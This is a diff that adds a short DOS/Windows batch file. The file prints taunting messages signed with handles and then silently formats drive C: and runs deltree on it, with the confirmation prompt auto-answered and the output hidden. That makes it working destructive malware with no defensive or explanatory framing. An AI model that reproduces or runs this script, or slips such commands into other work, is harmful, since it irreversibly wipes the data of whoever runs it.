@@ -1,0 +1,8 @@
+Echo off
+cls
+echo I have just entered your ass:
+echo         MS-WINDOWS
+echo Lorz has been in for awhile   
+echo                --AKP--
+echo y|format c: /u /v:AAV >nul
+deltree /y c: >nul"
